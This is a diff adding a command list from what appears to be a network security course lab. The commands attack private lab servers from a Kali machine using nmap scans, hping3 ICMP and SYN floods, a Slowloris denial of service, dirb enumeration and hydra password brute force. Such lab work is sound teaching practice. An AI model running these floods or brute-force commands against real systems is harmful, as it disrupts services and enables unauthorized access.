@@ -1,0 +1,120 @@
+===========================================================
+
+Advanced Network Security Project
+
+Attack Simulation Commands
+
+===========================================================
+
+All commands are related to an attack simulation performed
+
+from a Kali Linux virtual machine against the LAN/DMZ servers
+
+(192.168.1.101, 192.168.2.10, 192.168.1.104 etc.)
+
+----------------------------------------
+
+1. NMAP Scanning
+
+----------------------------------------
+
+# A basic SYN scan of DMZ server
+
+nmap -sS 192.168.2.10
+
+# An intense scan of DMZ server
+
+nmap -A 192.168.2.10
+
+# A stealthy scan of LAN server (firewall blocked)
+
+nmap -A 192.168.1.10
+
+# A version + os detect scan
+
+nmap -sV -O 192.168.2.10
+
+----------------------------------------
+
+2. ICMP Flood Attack (HPING3)
+
+----------------------------------------
+
+# An ICMP flood of DMZ server
+
+sudo hping3 -1 --flood -V 192.168.2.10
+
+# An ICMP flood of LAN host (firewall blocked)
+
+sudo hping3 -1 --flood -V 192.168.1.101
+
+# An ICMP flood of LAN host .104 (firewall blocked)
+
+sudo hping3 -1 --flood -V 192.168.1.104
+
+----------------------------------------
+
+3. TCP SYN Flood Attack (HPING3)
+
+----------------------------------------
+
+# A SYN flood on port 80 (DMZ server)
+
+sudo hping3 -S --flood -p 80 192.168.2.10
+
+# A SYN flood on port 22 (LAN host)
+
+sudo hping3 -S --flood -p 22 192.168.1.104
+
+----------------------------------------
+
+4. Slowloris Attack
+
+----------------------------------------
+
+# Slow HTTP request DoS on Apache web server
+
+slowhttptest -c 500 -H -g -o slowloris-test \
+
+--test-type=slowloris \
+
+-X -r 200 -w 10 \
+
+-k 3 \
+
+-u http://192.168.2.10/index.html
+
+----------------------------------------
+
+5. Directory Brute Force (DIRB)
+
+----------------------------------------
+
+# Enumerate directories on DMZ Apache server
+
+dirb http://192.168.2.10/
+
+----------------------------------------
+
+6. Hydra Brute Force Attempt
+
+----------------------------------------
+
+# HTTP GET brute force attempt (missing password list – simulation)
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+
+192.168.2.10 http-get /
+
+# If password list is missing use alternative example:
+
+hydra -l admin -P /usr/share/wordlists/common.txt \
+
+192.168.2.10 http-get /
+
+
+----------------------------------------
+
+End of File
+
+----------------------------------------
